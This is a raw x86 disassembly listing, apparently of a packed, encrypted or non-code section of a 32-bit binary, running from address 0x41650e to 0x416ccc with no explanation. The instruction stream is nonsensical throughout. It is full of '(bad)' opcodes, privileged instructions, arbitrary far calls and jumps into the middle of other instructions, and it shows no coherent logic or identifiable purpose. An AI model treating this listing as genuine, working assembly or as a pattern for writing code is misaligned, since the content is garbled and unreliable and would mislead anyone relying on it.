  41650e:	adc    al,BYTE PTR [eiz*8-0x422066ce]
  416515:	sub    DWORD PTR [ecx],eax
  416517:	adc    DWORD PTR [ebx-0x65],ecx
  41651a:	sar    dh,cl
  41651c:	div    BYTE PTR ds:[edi+0x6c]
  416520:	push   esi
  416521:	leave  
  416522:	mov    ds:0xe5efd9b6,eax
  416527:	push   edi
  416528:	call   0x24c:0xdd21273f
  41652f:	repz inc ecx
  416531:	icebp  
  416532:	lods   al,BYTE PTR ds:[esi]
  416533:	das    
  416534:	xlat   BYTE PTR ds:[ebx]
  416535:	pop    ecx
  416536:	cdq    
  416537:	rcl    ah,0x6c
  41653a:	pushf  
  41653b:	pop    edi
  41653c:	mov    BYTE PTR [ebx],cl
  41653e:	add    al,0x35
  416540:	pop    es
  416541:	inc    eax
  416542:	xchg   ebp,eax
  416543:	inc    ebx
  416544:	das    
  416545:	xchg   si,ax
  416547:	jge    0x416542
  416549:	push   ecx
  41654a:	inc    esp
  41654b:	pop    eax
  41654c:	div    ebp
  41654e:	push   ebp
  41654f:	ror    DWORD PTR [ebx],0x36
  416552:	pop    ds
  416553:	imul   ebp,DWORD PTR [eax+0x26],0x14301b9f
  41655a:	nop
  41655b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41655c:	les    esi,FWORD PTR [eax]
  41655e:	leave  
  41655f:	aaa    
  416560:	(bad)  
  416562:	mov    ah,0x16
  416564:	push   ds
  416565:	xchg   ecx,eax
  416566:	into   
  416567:	jnp    0x4164ed
  416569:	int3   
  41656a:	mov    ds:0x4ea26588,eax
  41656f:	ja     0x4165b5
  416571:	add    DWORD PTR [ebp-0x4024ac9f],ecx
  416577:	xchg   ecx,eax
  416578:	jb     0x416593
  41657a:	sbb    al,0x1d
  41657c:	hlt    
  41657d:	aam    0x58
  41657f:	data16 jno 0x416518
  416582:	mov    ds:0x5bbfe6e8,eax
  416587:	cmc    
  416588:	jae    0x41653b
  41658a:	jae    0x41659b
  41658c:	add    edx,DWORD PTR [ebx-0x46]
  41658f:	jmp    0xd6fb:0x2a63f1d1
  416596:	push   edx
  416597:	mov    ch,0x78
  416599:	and    DWORD PTR [ecx+0x65],eax
  41659c:	cmp    dh,bl
  41659e:	sub    al,0xe9
  4165a0:	int3   
  4165a1:	adc    BYTE PTR [ecx],bh
  4165a3:	ds cs cs js 0x4165ff
  4165a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165a9:	jmp    0x4165aa
  4165ab:	jbe    0x416538
  4165ad:	xchg   esp,eax
  4165ae:	sbb    edx,DWORD PTR [ebp+0x55]
  4165b1:	mov    ebp,0x1ecb6ab3
  4165b6:	pop    edx
  4165b7:	adc    bl,cl
  4165b9:	xor    al,BYTE PTR [ecx+0x1e]
  4165bc:	mov    cl,0x83
  4165be:	or     eax,0x128b990e
  4165c3:	mov    ecx,0x344f3481
  4165c8:	pop    eax
  4165c9:	mov    eax,0xdbacea21
  4165ce:	sub    ch,al
  4165d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165d1:	push   edx
  4165d2:	xor    BYTE PTR ds:0xcb6f123c,dl
  4165d8:	shl    edi,cl
  4165da:	sub    BYTE PTR es:[edx+0x1a31fbe],cl
  4165e1:	loop   0x416657
  4165e3:	out    dx,al
  4165e4:	popa   
  4165e5:	or     dl,0xaf
  4165e8:	adc    DWORD PTR [ebx],ecx
  4165ea:	int    0xbc
  4165ec:	pinsrw mm2,WORD PTR [ebx-0x6eafd639],0x7a
  4165f4:	xlat   BYTE PTR ds:[ebx]
  4165f5:	jo     0x416658
  4165f7:	dec    eax
  4165f8:	daa    
  4165f9:	stc    
  4165fa:	inc    ecx
  4165fb:	not    edi
  4165fd:	mov    esi,0x70114631
  416602:	mov    eax,0x1049c136
  416607:	popf   
  416608:	mov    cl,0x81
  41660a:	hlt    
  41660b:	xor    DWORD PTR [edi],esp
  41660d:	mov    ah,0x2a
  41660f:	je     0x416648
  416611:	(bad)  
  416612:	cs jl  0x41659c
  416615:	mov    al,0xd
  416617:	sti    
  416618:	sub    ebx,esi
  41661a:	sub    eax,0x25e5d43a
  41661f:	cli    
  416620:	cli    
  416621:	adc    al,0x53
  416623:	cmp    al,0xbd
  416625:	not    DWORD PTR [eax+0x5b]
  416628:	cdq    
  416629:	dec    esi
  41662a:	jae    0x416693
  41662c:	xchg   edx,eax
  41662d:	pop    ebx
  41662e:	inc    ebp
  41662f:	push   ss
  416630:	push   es
  416631:	imul   ebx,DWORD PTR [ebx-0x55ba6c55],0x8a2f7ffc
  41663b:	in     al,0x77
  41663d:	inc    esi
  41663e:	das    
  41663f:	mov    WORD PTR [eax-0x670b7e2e],es
  416645:	dec    ebx
  416646:	std    
  416647:	mov    al,ds:0xdda6d00f
  41664c:	lock sbb cl,BYTE PTR [ecx+0x128cc241]
  416653:	data16 lahf 
  416655:	cmp    bh,cl
  416657:	fcomp  st(0)
  416659:	cmp    al,0xce
  41665b:	mov    al,ds:0x5dbdb5ed
  416660:	mov    dh,0xf7
  416662:	out    0x4b,eax
  416664:	mov    ah,0x74
  416666:	daa    
  416667:	lods   al,BYTE PTR ds:[esi]
  416668:	xchg   ebp,eax
  416669:	ds pop esi
  41666b:	int    0x48
  41666d:	stos   DWORD PTR es:[edi],eax
  41666e:	inc    eax
  41666f:	out    dx,al
  416670:	adc    DWORD PTR ds:0xefeb8579,edi
  416676:	sub    DWORD PTR [ebp+edx*4+0x70],0xffffffa9
  41667b:	or     edx,DWORD PTR [edx]
  41667d:	mov    al,ds:0x4a39e01f
  416682:	add    eax,0xf3cc631e
  416687:	push   ecx
  416688:	pop    ebx
  416689:	aam    0xb0
  41668b:	push   eax
  41668c:	(bad)  
  41668d:	cmp    ecx,esi
  41668f:	js     0x4166be
  416691:	xchg   edx,eax
  416692:	es frstpm(287 only) 
  416695:	(bad)  
  416696:	sbb    DWORD PTR [edx],0xebfca2dd
  41669c:	push   es
  41669d:	enter  0x63b9,0x56
  4166a1:	push   0x928501a1
  4166a6:	adc    al,0x8
  4166a8:	sahf   
  4166a9:	shl    DWORD PTR [ebx-0x395ee3f9],1
  4166af:	and    eax,0x61ed14b6
  4166b4:	pop    esp
  4166b5:	shr    BYTE PTR [ebp-0x33dba0e0],0xb6
  4166bc:	pop    esi
  4166bd:	xor    DWORD PTR ds:0xb9580a2d,0x9bd3ad56
  4166c7:	cmp    BYTE PTR [eax+0x5e],dh
  4166ca:	push   ecx
  4166cb:	div    BYTE PTR [ebx]
  4166cd:	cmp    dh,BYTE PTR [ebp+ecx*2-0x24]
  4166d1:	fwait
  4166d2:	sub    bh,BYTE PTR [edi-0x2b354db5]
  4166d8:	les    esp,FWORD PTR gs:[esi+ebp*4]
  4166dc:	fcmovbe st,st(3)
  4166de:	dec    ebx
  4166df:	fisttp DWORD PTR [ecx+0x2a5f0589]
  4166e5:	leave  
  4166e6:	xchg   esi,eax
  4166e7:	aad    0xaa
  4166e9:	or     esi,DWORD PTR [eax]
  4166eb:	xchg   esp,eax
  4166ec:	hlt    
  4166ed:	stos   BYTE PTR es:[edi],al
  4166ee:	sub    cl,BYTE PTR [edi]
  4166f0:	shl    BYTE PTR [edx+0x71],cl
  4166f3:	xchg   esi,eax
  4166f4:	js     0x416710
  4166f6:	cmp    eax,0x22cc6e46
  4166fb:	inc    ebx
  4166fc:	push   es
  4166fd:	adc    DWORD PTR [esi+0x18ac9a33],edi
  416703:	add    DWORD PTR [edi-0x4f653977],ecx
  416709:	fcomip st,st(3)
  41670b:	(bad)  
  41670c:	and    eax,0x977bfe61
  416711:	mov    al,0xe7
  416713:	cmp    dh,BYTE PTR [edx-0x64]
  416716:	jbe    0x4166b7
  416718:	mov    BYTE PTR [edx-0x4a653ff4],dh
  41671e:	mov    ah,0x44
  416720:	mov    ds:0xc31b6aec,eax
  416725:	xor    eax,0xd5a1d198
  41672a:	stc    
  41672b:	push   0xc76c1fd7
  416730:	cwde   
  416731:	imul   ah
  416733:	jns    0x4167ac
  416735:	xor    BYTE PTR [edx],ch
  416737:	dec    edi
  416738:	test   ch,bh
  41673a:	cmovl  edx,eax
  41673d:	add    DWORD PTR [edx-0x46a59a7f],edi
  416743:	je     0x4166ee
  416745:	push   esp
  416746:	cmc    
  416747:	sub    eax,DWORD PTR [ecx+0x60]
  41674a:	xchg   ebx,eax
  41674b:	cmp    al,0x2f
  41674d:	mov    bl,0x99
  41674f:	(bad)  
  416751:	xchg   edi,eax
  416752:	and    al,0x87
  416754:	mov    ch,0x32
  416756:	sbb    bh,bl
  416758:	jg     0x416789
  41675a:	dec    ebx
  41675b:	xor    ch,BYTE PTR [edi+edi*2-0x66]
  41675f:	(bad)
  416762:	iret   
  416763:	cmp    BYTE PTR [edx-0x3f],ch
  416766:	test   DWORD PTR [eax+0x5d58e828],0x1fa060bc
  416770:	loope  0x416779
  416772:	test   esp,edi
  416774:	add    DWORD PTR [edi+0x2b2b459c],edi
  41677a:	fscale 
  41677c:	mov    ds,WORD PTR [ebx+0x67]
  41677f:	xchg   esi,eax
  416780:	iret   
  416781:	jno    0x416756
  416783:	je     0x41670d
  416785:	inc    esi
  416786:	sub    dh,bl
  416788:	pop    ebx
  416789:	jns    0x416745
  41678b:	jge    0x416808
  41678d:	mov    edx,0x931605cd
  416792:	nop
  416793:	lds    eax,FWORD PTR [ebx+0x1afc33eb]
  416799:	add    ch,BYTE PTR [eax]
  41679b:	push   esp
  41679c:	pop    eax
  41679d:	xchg   ebp,eax
  41679e:	pop    edx
  41679f:	hlt    
  4167a0:	addr16 aam 0xb3
  4167a3:	fnstsw WORD PTR [eax]
  4167a5:	inc    ebp
  4167a6:	shl    DWORD PTR [ebp-0x20],0x45
  4167aa:	popa   
  4167ab:	(bad)  
  4167ac:	mov    ecx,ds
  4167ae:	add    al,0x20
  4167b0:	xchg   ebx,eax
  4167b1:	ret    
  4167b2:	sub    eax,0x7145f4e9
  4167b7:	inc    ebx
  4167b8:	inc    ecx
  4167b9:	add    BYTE PTR [edx],cl
  4167bb:	jg     0x4167d3
  4167bd:	shl    BYTE PTR [ecx-0x3a011350],1
  4167c3:	cmp    al,0xea
  4167c5:	jmp    0xee05:0x56cbdb43
  4167cc:	fwait
  4167cd:	xchg   ecx,eax
  4167ce:	imul   eax,DWORD PTR [eax+0x1f065310],0xffffffc4
  4167d5:	sub    DWORD PTR [ecx+0x9f200ba],ebp
  4167db:	mov    dl,0x97
  4167dd:	ds mov ah,0x77
  4167e0:	mov    ecx,gs
  4167e2:	js     0x4167f8
  4167e4:	adc    cl,0x25
  4167e7:	sbb    DWORD PTR [eax-0x52],esi
  4167ea:	fidiv  WORD PTR [edi+0x572a328a]
  4167f0:	mov    al,0x1c
  4167f2:	into   
  4167f3:	int3   
  4167f4:	lds    edx,FWORD PTR [edi]
  4167f6:	push   cs
  4167f7:	mov    cl,0xed
  4167f9:	daa    
  4167fa:	dec    edi
  4167fb:	lods   al,BYTE PTR ss:[esi]
  4167fd:	inc    ecx
  4167fe:	call   0x58b:0xdd76f4bd
  416805:	cmp    BYTE PTR ds:[esi+0x11],al
  416809:	ja     0x41681b
  41680b:	push   esi
  41680c:	fisub  DWORD PTR [edx+esi*4]
  41680f:	mov    ebx,0x43feae8c
  416814:	mov    ds:0x26de82c4,eax
  416819:	dec    edx
  41681a:	inc    esi
  41681b:	fisubr WORD PTR [edx-0x116e79b5]
  416821:	xchg   ebx,eax
  416822:	inc    ebx
  416823:	xor    al,0x91
  416825:	xchg   edx,eax
  416826:	cmp    BYTE PTR [edi],al
  416828:	xor    esi,DWORD PTR [ecx+eiz*4+0x6337b6bd]
  41682f:	loope  0x416894
  416831:	fs pop ecx
  416833:	and    edi,DWORD PTR [esi+0x57c13073]
  416839:	lahf   
  41683a:	cmp    bl,BYTE PTR [ebp-0x55]
  41683d:	clc    
  41683e:	sahf   
  41683f:	sub    DWORD PTR ds:0xc66a7e4c,edi
  416845:	jl     0x4167cf
  416847:	fwait
  416848:	inc    edx
  416849:	cmp    eax,DWORD PTR [ebx+0x5a]
  41684c:	cmp    ebp,DWORD PTR [edi]
  41684e:	sub    ebx,DWORD PTR [esi-0x59d2867b]
  416854:	add    al,0xaf
  416856:	sti    
  416857:	bound  ecx,QWORD PTR [esi+0x22f3c07]
  41685d:	retf   0x72bd
  416860:	retf   0xe93e
  416863:	int3   
  416864:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416865:	arpl   WORD PTR [edi],di
  416867:	push   ds
  416868:	fsubr  DWORD PTR [edx-0x25]
  41686b:	shr    BYTE PTR [esi+0x5f082d34],cl
  416871:	lahf   
  416872:	repz in al,0xc9
  416875:	xor    al,0xf7
  416877:	leave  
  416878:	test   al,0xe1
  41687a:	call   0xd708:0x6333ea67
  416881:	cmp    edi,edx
  416883:	cs xchg ebx,eax
  416885:	cmc    
  416886:	cmp    al,0xb2
  416888:	out    0x27,al
  41688a:	ror    BYTE PTR [edx-0x77e057b3],1
  416890:	gs fstp st(1)
  416893:	not    BYTE PTR [edx]
  416895:	xchg   esi,eax
  416896:	lods   al,BYTE PTR ds:[esi]
  416897:	loope  0x4168ec
  416899:	imul   esi,DWORD PTR [eax+0x64],0x7e
  41689d:	add    eax,0xcb2d356e
  4168a2:	fs pop eax
  4168a4:	test   eax,0xdda55c23
  4168a9:	rcr    DWORD PTR [edi],1
  4168ab:	lods   al,BYTE PTR ds:[esi]
  4168ac:	push   cs
  4168ad:	lds    ecx,FWORD PTR [ecx+0x134d3eb]
  4168b3:	mov    dl,0x99
  4168b5:	xchg   DWORD PTR [ebx+ebx*1],edx
  4168b8:	push   eax
  4168b9:	mov    eax,ds:0x81291601
  4168be:	xor    cl,BYTE PTR [ebx]
  4168c0:	retf   0xf8bb
  4168c3:	outs   dx,DWORD PTR ds:[esi]
  4168c4:	inc    ebx
  4168c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168c6:	test   ebp,ecx
  4168c8:	cmp    ch,BYTE PTR [ebx]
  4168ca:	rcr    BYTE PTR [ecx],1
  4168cc:	arpl   WORD PTR [ecx+0x591f725b],bx
  4168d2:	jb     0x4168b9
  4168d4:	add    al,0x2d
  4168d6:	in     eax,0xbd
  4168d8:	add    eax,DWORD PTR [esi-0x1e]
  4168db:	mov    eax,ds:0xa3a23633
  4168e0:	outs   dx,DWORD PTR ds:[esi]
  4168e1:	lea    ebp,[edx+0x3cef1a3d]
  4168e7:	inc    eax
  4168e8:	rol    DWORD PTR [edi],1
  4168ea:	xchg   ecx,eax
  4168eb:	lahf   
  4168ec:	into   
  4168ed:	lods   eax,DWORD PTR ds:[esi]
  4168ee:	adc    BYTE PTR [ecx],bl
  4168f0:	pop    esp
  4168f1:	inc    ebx
  4168f2:	mov    WORD PTR [esi],cs
  4168f4:	rcl    DWORD PTR [ebx],1
  4168f6:	test   DWORD PTR [eax+ebp*2],ebp
  4168f9:	(bad)  [eax+0x11a3e1f1]
  4168ff:	outs   dx,DWORD PTR ds:[esi]
  416900:	jbe    0x41694a
  416902:	and    eax,0x3265d698
  416907:	xchg   esp,eax
  416908:	or     al,0xa3
  41690a:	add    ebp,eax
  41690c:	(bad)  
  41690d:	jl     0x416912
  41690f:	(bad)  
  416910:	inc    BYTE PTR [edi]
  416912:	popf   
  416913:	cmp    ah,BYTE PTR [ebp-0x1d13dbc7]
  416919:	mov    cl,0x83
  41691b:	ficomp WORD PTR [ecx-0x27e4a170]
  416921:	lods   al,BYTE PTR ds:[esi]
  416922:	adc    dh,BYTE PTR [edx+0x6e7837d4]
  416928:	mov    ah,0x96
  41692a:	hlt    
  41692b:	or     BYTE PTR ds:0x256223e,dl
  416931:	sti    
  416932:	and    BYTE PTR [ebp-0x43ced881],ah
  416938:	mov    bh,0xff
  41693a:	lahf   
  41693b:	sub    dl,ah
  41693d:	fwait
  41693e:	mov    esp,0x795b8c27
  416943:	jae    0x416984
  416945:	ficom  WORD PTR [ecx+ebp*8]
  416948:	loop   0x4169be
  41694a:	mov    esp,0x69e1f073
  41694f:	dec    eax
  416950:	loope  0x41697a
  416952:	call   DWORD PTR [ecx+0x54e6e7e9]
  416958:	imul   eax,DWORD PTR [esi-0x700d6513],0x7573c2c6
  416962:	sub    DWORD PTR [esi+0x66],edx
  416965:	das    
  416966:	adc    dl,ah
  416968:	call   0xdcf56416
  41696d:	mov    ds:0xf43f552a,eax
  416972:	int3   
  416973:	push   edx
  416974:	cmp    bh,bl
  416976:	imul   ebx,DWORD PTR [esi],0xb6991243
  41697c:	adc    esi,DWORD PTR [edx]
  41697e:	push   esi
  41697f:	push   ds
  416980:	outs   dx,BYTE PTR ds:[esi]
  416981:	xlat   BYTE PTR ds:[bx]
  416983:	sub    al,0xd9
  416985:	add    al,dh
  416987:	push   edx
  416988:	xor    edx,DWORD PTR [ebx]
  41698a:	loop   0x4169ec
  41698c:	dec    esp
  41698d:	fld    TBYTE PTR [ebp-0x4c091c38]
  416993:	mov    ch,0xdc
  416995:	push   ds
  416996:	(bad)  
  416997:	fldenv [edi]
  416999:	(bad)  
  41699a:	les    ecx,FWORD PTR [ebp+edi*4-0x7e04ef47]
  4169a1:	js     0x4169b7
  4169a3:	fcom   QWORD PTR [edx-0x7]
  4169a6:	pop    edi
  4169a7:	pop    edi
  4169a8:	adc    DWORD PTR [ecx+0x7],eax
  4169ab:	pop    ebx
  4169ac:	pop    edi
  4169ad:	jg     0x416959
  4169af:	pop    esp
  4169b0:	popf   
  4169b1:	outs   dx,DWORD PTR ds:[esi]
  4169b2:	inc    esi
  4169b3:	scas   eax,DWORD PTR es:[edi]
  4169b4:	dec    eax
  4169b5:	repnz pop esi
  4169b7:	outs   dx,BYTE PTR ds:[esi]
  4169b8:	loopne 0x416984
  4169ba:	jmp    0x8a7e:0xb569cb2b
  4169c1:	add    dh,bl
  4169c3:	lea    ebp,[ecx]
  4169c5:	mov    DWORD PTR [eax],ebp
  4169c7:	pop    eax
  4169c8:	adc    BYTE PTR [edi-0x67],dl
  4169cb:	lods   eax,DWORD PTR ds:[esi]
  4169cc:	daa    
  4169cd:	test   DWORD PTR [eax],eax
  4169cf:	loope  0x416979
  4169d1:	idiv   BYTE PTR [ebp-0xac10edb]
  4169d7:	dec    edi
  4169d8:	adc    ebx,eax
  4169da:	inc    esi
  4169db:	jmp    0xf42ab791
  4169e0:	ins    DWORD PTR es:[edi],dx
  4169e1:	pop    es
  4169e2:	and    al,0xf8
  4169e4:	push   eax
  4169e5:	cmp    edi,eax
  4169e7:	fidiv  WORD PTR [ebx]
  4169e9:	shl    esi,0xb3
  4169ec:	data16 add al,0xdb
  4169ef:	pop    ebx
  4169f0:	ret    
  4169f1:	rcr    DWORD PTR [edi+0x56246006],0x2e
  4169f8:	lahf   
  4169f9:	mov    edi,0x58fe5ecd
  4169fe:	sbb    ch,BYTE PTR [edx+edi*8-0x68c4d6de]
  416a05:	repz mov dl,0x4f
  416a08:	repnz into 
  416a0a:	xchg   ebx,eax
  416a0b:	int    0x3b
  416a0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a0e:	xlat   BYTE PTR ds:[ebx]
  416a0f:	aad    0x92
  416a11:	xor    ebx,DWORD PTR [ebp+ecx*8-0x6c8bdcd7]
  416a18:	(bad)  ss:[ebx]
  416a1b:	pop    ds
  416a1c:	nop
  416a1d:	ins    BYTE PTR es:[edi],dx
  416a1e:	imul   edi,DWORD PTR [edi-0x3bdab6fe],0xa9955673
  416a28:	xchg   ecx,eax
  416a29:	mov    ds:0x5b0477e8,al
  416a2e:	push   ebx
  416a2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a30:	jmp    0x9e7a:0x66464e15
  416a37:	sbb    al,0x15
  416a39:	mov    ah,0x44
  416a3b:	xor    BYTE PTR [ecx-0x6],al
  416a3e:	cmp    BYTE PTR [ebx],dl
  416a40:	cmp    eax,DWORD PTR [ecx+0x38]
  416a43:	mov    esp,0xbb13561e
  416a48:	cmc    
  416a49:	je     0x4169ea
  416a4b:	add    dl,BYTE PTR [edx+0x65]
  416a4e:	mov    BYTE PTR [ebp+0x1b],dl
  416a51:	out    dx,eax
  416a52:	lods   al,BYTE PTR ds:[esi]
  416a53:	cli    
  416a54:	hlt    
  416a55:	clc    
  416a56:	inc    esi
  416a57:	arpl   bp,dx
  416a59:	jmp    0x416ac8
  416a5b:	jns    0x416ad9
  416a5d:	(bad)  
  416a5e:	fistp  DWORD PTR [ebx-0x365f85a9]
  416a64:	sub    bl,al
  416a66:	dec    eax
  416a67:	push   edi
  416a68:	xchg   edi,eax
  416a69:	idiv   dl
  416a6b:	out    dx,eax
  416a6c:	fimul  DWORD PTR [edx-0x56ed012d]
  416a72:	shl    ebx,1
  416a74:	adc    DWORD PTR [ecx-0x3],eax
  416a77:	cmp    bh,ah
  416a79:	jns    0x416a68
  416a7b:	rcl    DWORD PTR [edi+0x54f04fbe],1
  416a81:	fs clc 
  416a83:	jg     0x416a9a
  416a85:	push   0x24
  416a87:	mov    ebx,0x17788212
  416a8c:	jmp    0x416a31
  416a8e:	imul   edx,edi,0xffffffee
  416a91:	inc    edx
  416a92:	shl    BYTE PTR [edx],1
  416a94:	icebp  
  416a95:	loope  0x416a79
  416a97:	mov    BYTE PTR [ecx-0x2cc388a7],dh
  416a9d:	fwait
  416a9e:	xor    al,0x51
  416aa0:	sbb    dh,cl
  416aa2:	ins    BYTE PTR es:[edi],dx
  416aa3:	out    0xfa,al
  416aa5:	jns    0x416b07
  416aa7:	or     eax,DWORD PTR [edx]
  416aa9:	pop    esp
  416aaa:	and    edx,DWORD PTR [ecx+0x2e]
  416aad:	popf   
  416aae:	daa    
  416aaf:	jnp    0x416b1d
  416ab1:	aas    
  416ab2:	add    al,0x9b
  416ab4:	or     edx,DWORD PTR [eax-0x1f]
  416ab7:	jl     0x416aa7
  416ab9:	loop   0x416a7a
  416abb:	push   0xffffff98
  416abd:	(bad)  [ecx+0x523d56c9]
  416ac3:	inc    edx
  416ac4:	mov    esi,DWORD PTR [esi-0x15]
  416ac7:	mov    bl,0x38
  416ac9:	pop    ecx
  416aca:	dec    ebp
  416acb:	cld    
  416acc:	in     eax,0x8e
  416ace:	cmp    ecx,DWORD PTR [edi]
  416ad0:	test   al,0x56
  416ad2:	and    ebp,ebp
  416ad4:	jg     0x416b36
  416ad6:	(bad)  
  416ad7:	sahf   
  416ad8:	xor    BYTE PTR [esi-0x51465e1f],bl
  416ade:	mov    dh,0x1
  416ae0:	or     eax,0x67f8d82d
  416ae5:	push   ecx
  416ae6:	repz pop edi
  416ae8:	mov    esp,0x4caaa90
  416aed:	aad    0x4c
  416aef:	loope  0x416ab7
  416af1:	jmp    0xb01ad189
  416af6:	and    al,bh
  416af8:	test   eax,0xf7c093fe
  416afd:	les    eax,FWORD PTR [ecx+0x42]
  416b00:	sbb    al,BYTE PTR ds:0xcd9b11b2
  416b06:	jp     0x416b2b
  416b08:	test   cl,bl
  416b0a:	cmp    dl,BYTE PTR [esp+eax*8]
  416b0d:	int    0x87
  416b0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b10:	test   eax,0x5d2d2232
  416b15:	loope  0x416b28
  416b17:	xor    esp,DWORD PTR [ecx+ebp*8+0x28]
  416b1b:	ficom  WORD PTR [esi+0x6f]
  416b1e:	or     esp,DWORD PTR [ebx+0x4aa7d9cc]
  416b24:	bt     DWORD PTR [ebx],eax
  416b27:	dec    edi
  416b28:	add    ch,cl
  416b2a:	je     0x416b8c
  416b2c:	or     BYTE PTR [ecx-0x498e7916],0xa7
  416b33:	int3   
  416b34:	dec    edx
  416b35:	pop    esp
  416b36:	mov    edx,0x59c44680
  416b3b:	cld    
  416b3c:	cli    
  416b3d:	fnsave [esi-0x2e]
  416b40:	mov    bh,0x33
  416b42:	or     BYTE PTR [edi-0x2a],ch
  416b45:	pop    ecx
  416b46:	inc    BYTE PTR [esi+0x7fe76662]
  416b4c:	ss repz pop ss
  416b4f:	ins    BYTE PTR es:[edi],dx
  416b50:	and    BYTE PTR [esi-0x38d1f72c],bh
  416b56:	(bad)  
  416b58:	jno    0x416b82
  416b5a:	xlat   BYTE PTR ds:[ebx]
  416b5b:	pop    edi
  416b5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b5d:	scas   eax,DWORD PTR es:[edi]
  416b5e:	sbb    BYTE PTR [edi-0x6c1a045],bl
  416b64:	fdivr  DWORD PTR [ecx]
  416b66:	xor    BYTE PTR [ebp-0x23],bh
  416b69:	into   
  416b6a:	dec    esp
  416b6b:	bound  ecx,QWORD PTR [esi]
  416b6d:	mov    ds:0x496dcb1b,eax
  416b72:	add    ah,dl
  416b74:	mov    BYTE PTR [ecx+0x34],dl
  416b77:	push   ss
  416b78:	jno    0x416afe
  416b7a:	jb     0x416bb8
  416b7c:	sub    al,0x51
  416b7e:	jnp    0x416bb8
  416b80:	test   ebp,esp
  416b82:	sbb    eax,0xaf1f3f2a
  416b87:	rol    DWORD PTR [edi+edi*2],1
  416b8a:	repnz or BYTE PTR [esi+0x5d],al
  416b8e:	test   ecx,0x79e3ba72
  416b94:	(bad)  
  416b95:	sti    
  416b96:	add    edi,ebx
  416b98:	inc    edx
  416b99:	rcl    BYTE PTR ds:0x39c67667,1
  416b9f:	inc    ebp
  416ba0:	(bad)  
  416ba1:	enter  0x6f34,0x38
  416ba5:	shr    BYTE PTR [edi+0x3d52db27],0xc4
  416bac:	aad    0xa9
  416bae:	jne    0x416c19
  416bb0:	and    dl,BYTE PTR [edx-0x46]
  416bb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bb4:	mov    bl,0xa7
  416bb6:	(bad)  
  416bb7:	imul   edi,edi,0xdf8da048
  416bbd:	call   0xaa42:0x26e308e9
  416bc4:	clc    
  416bc5:	gs (bad) 
  416bc7:	cmc    
  416bc8:	xchg   ecx,eax
  416bc9:	jl     0x416b8a
  416bcb:	ficom  WORD PTR [esi]
  416bcd:	(bad)  
  416bce:	js     0x416c26
  416bd0:	faddp  st(5),st
  416bd2:	push   esi
  416bd3:	pop    ss
  416bd4:	cwde   
  416bd5:	mov    edi,0x9c14092d
  416bda:	cmp    edi,DWORD PTR [ebp+ecx*4-0x36dfa977]
  416be1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416be2:	mov    esi,0x8b3ecfee
  416be7:	popa   
  416be8:	rol    BYTE PTR [ebx],cl
  416bea:	add    eax,0x9d8e009d
  416bef:	inc    esp
  416bf0:	cdq    
  416bf1:	pop    ecx
  416bf2:	mov    ds:0x71330bd8,al
  416bf7:	neg    DWORD PTR [edx-0x2c]
  416bfa:	and    BYTE PTR [edx+0x33],bh
  416bfd:	pop    edi
  416bfe:	jnp    0x416c58
  416c00:	in     eax,0x53
  416c02:	pop    ds
  416c03:	icebp  
  416c04:	jb     0x416beb
  416c06:	ds mov edx,0x386389a4
  416c0c:	retf   
  416c0d:	mov    al,0x11
  416c0f:	loopne 0x416c03
  416c11:	jle    0x416c4d
  416c13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c14:	cmp    BYTE PTR [eax-0x4cde7c13],dl
  416c1a:	dec    edx
  416c1b:	dec    esp
  416c1c:	mov    eax,ds:0x2735a10a
  416c21:	push   edx
  416c22:	retf   
  416c23:	loopne 0x416be2
  416c25:	cmp    BYTE PTR ds:0xa921ae14,cl
  416c2b:	pop    es
  416c2c:	loop   0x416c83
  416c2e:	adc    cl,BYTE PTR [edx]
  416c30:	jne    0x416c15
  416c32:	add    DWORD PTR [eax+0x2644dfe4],ebx
  416c38:	add    al,0x86
  416c3a:	jne    0x416c0d
  416c3c:	cwde   
  416c3d:	dec    ecx
  416c3e:	shr    ebp,cl
  416c40:	scas   al,BYTE PTR es:[edi]
  416c41:	ss jnp 0x416be1
  416c44:	cmp    BYTE PTR [ebp-0x2d246724],dl
  416c4a:	out    dx,eax
  416c4b:	inc    ebx
  416c4c:	add    BYTE PTR [eax],al
  416c4e:	aas    
  416c4f:	jmp    FWORD PTR [eax+ebx*2]
  416c52:	mov    DWORD PTR [eax],esi
  416c54:	sbb    eax,0x32aa6a4b
  416c59:	cmp    DWORD PTR [eax-0x633028b5],0xffffffaf
  416c60:	dec    edx
  416c61:	pop    ss
  416c62:	imul   edi,ecx,0x986f7e04
  416c68:	or     DWORD PTR [edi-0x2d],esp
  416c6b:	xor    BYTE PTR [ebx+edi*8-0x2a],ah
  416c6f:	out    0x1e,al
  416c71:	or     dl,al
  416c73:	mov    ds:0xcf3e7c6f,eax
  416c78:	jbe    0x416c6b
  416c7a:	or     ebx,DWORD PTR [esi]
  416c7c:	or     bh,dl
  416c7e:	fild   QWORD PTR [edx+0x4eafc1b2]
  416c84:	xchg   edx,eax
  416c85:	mov    WORD PTR [eax],?
  416c87:	fwait
  416c88:	push   0x5b
  416c8a:	inc    ebx
  416c8b:	(bad)  
  416c8c:	dec    eax
  416c8d:	fnstcw WORD PTR [ecx]
  416c8f:	dec    ecx
  416c90:	cmp    DWORD PTR [ebx+0x62],eax
  416c93:	pop    ds
  416c94:	dec    edi
  416c95:	cmp    DWORD PTR [ebx+0x8],0xa3615906
  416c9c:	ret    
  416c9d:	fwait
  416c9e:	mov    edx,0x9e9845aa
  416ca3:	imul   ah
  416ca5:	cs lock mov ecx,0xa6516f36
  416cac:	sbb    eax,DWORD PTR [esi+0x54a896b9]
  416cb2:	in     al,0x54
  416cb4:	dec    eax
  416cb5:	outs   dx,DWORD PTR ds:[esi]
  416cb6:	ret    
  416cb7:	push   0x10
  416cb9:	(bad)  
  416cba:	call   0xe1945973
  416cbf:	jmp    0x2665:0x6a7dba64
  416cc6:	lock mov al,ds:0x716e3ebe
  416ccc:	repz push ebx
